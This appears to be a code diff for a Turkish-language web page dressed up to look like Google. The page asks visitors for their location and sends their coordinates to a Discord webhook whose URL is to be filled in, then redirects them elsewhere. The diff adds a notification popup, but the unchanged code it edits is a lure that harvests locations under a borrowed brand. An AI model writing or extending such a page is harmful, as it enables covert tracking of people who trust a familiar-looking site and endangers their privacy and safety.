@@ -10,7 +10,7 @@
             margin: 0;
             padding: 0;
             background-color: #f4f4f4;
-            color: #202124; /* Google'ın renk tonu */
+            color: #202124;
             overflow: hidden;
         }
 
@@ -31,11 +31,44 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('https://source.unsplash.com/1600x900/?google'); /* Rastgele Google temalı resim */
+            background-image: url('https://source.unsplash.com/1600x900/?google');
             background-size: cover;
             background-position: center;
             z-index: -2;
             filter: blur(10px);
+        }
+
+        /* Üst Bilgi (Sağ Üst Bildirim Alanı) */
+        .top-bar {
+            position: fixed;
+            top: 0;
+            right: 0;
+            padding: 10px;
+            z-index: 10; /* Üstte kalması için */
+        }
+
+        .notification-box {
+            background-color: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 10px 15px;
+            font-size: 14px;
+            color: #555;
+            display: none; /* Başlangıçta gizli */
+            animation: slideIn 0.3s ease-in-out; /* Animasyon */
+        }
+
+        .notification-box.show {
+            display: block;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(0);
+            }
         }
 
         /* Ana İçerik */
@@ -55,7 +88,7 @@
             text-align: center;
             width: 90%;
             max-width: 500px;
-            position: relative; /* Daha iyi konumlandırma için */
+            position: relative;
         }
 
         .google-logo {
@@ -127,7 +160,6 @@
             text-decoration: none;
             margin: 0 10px;
         }
-
     </style>
 </head>
 <body>
@@ -135,6 +167,13 @@
     <!-- Arka Plan -->
     <div class="background-overlay"></div>
     <div class="background-image"></div>
+
+    <!-- Üst Bilgi (Sağ Üst Bildirim) -->
+    <div class="top-bar">
+        <div class="notification-box" id="notificationBox">
+            <p id="notificationText">Konum izni isteniyor...</p>
+        </div>
+    </div>
 
     <!-- İçerik Alanı -->
     <div class="container">
@@ -158,13 +197,17 @@
         </div>
     </div>
 
-
     <script>
         // WEBHOOK URL'NİZİ BURAYA YAZIN (Discord için)
         const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // ÖRNEK
         const locationMessage = document.getElementById('locationMessage');
+        const notificationBox = document.getElementById('notificationBox');
+        const notificationText = document.getElementById('notificationText');
 
         function requestLocation() {
+            // Bildirim kutusunu göster
+            showNotification("Konum izni isteniyor...");
+
             if ("geolocation" in navigator) {
                 locationMessage.classList.add('show');
                 navigator.geolocation.getCurrentPosition(
@@ -190,9 +233,9 @@
                             }]
                         });
                         locationMessage.textContent = "Konum başarıyla alındı! Yönlendiriliyorsunuz...";
+                        showNotification("Konum başarıyla alındı! Yönlendiriliyorsunuz...", 3000); // 3 saniye sonra kapat
                         setTimeout(() => {
-                            // Burada, asıl web sitenize yönlendirme yapılabilir
-                            window.location.href = "https://www.ornekwebsiteniz.com"; // Örnek yönlendirme
+                            window.location.href = "https://www.ornekwebsiteniz.com";
                             locationMessage.classList.remove('show');
                             locationMessage.textContent = "Konum alınıyor...";
                         }, 3000);
@@ -211,6 +254,7 @@
                                 break;
                         }
                         locationMessage.textContent = errorMessage;
+                        showNotification(errorMessage, 5000); // 5 saniye sonra kapat
                         setTimeout(() => {
                            locationMessage.classList.remove('show');
                            locationMessage.textContent = "Konum alınıyor...";
@@ -219,10 +263,22 @@
                 );
             } else {
                 locationMessage.textContent = "Tarayıcınız konum özelliğini desteklemiyor.";
+                showNotification("Tarayıcınız konum özelliğini desteklemiyor.", 5000); // 5 saniye sonra kapat
                 setTimeout(() => {
                     locationMessage.classList.remove('show');
                     locationMessage.textContent = "Konum alınıyor...";
                 }, 5000);
+            }
+        }
+
+        // Bildirim Göster Fonksiyonu
+        function showNotification(message, duration = null) {
+            notificationText.textContent = message;
+            notificationBox.classList.add('show');
+            if (duration) {
+                setTimeout(() => {
+                    notificationBox.classList.remove('show');
+                }, duration);
             }
         }
 
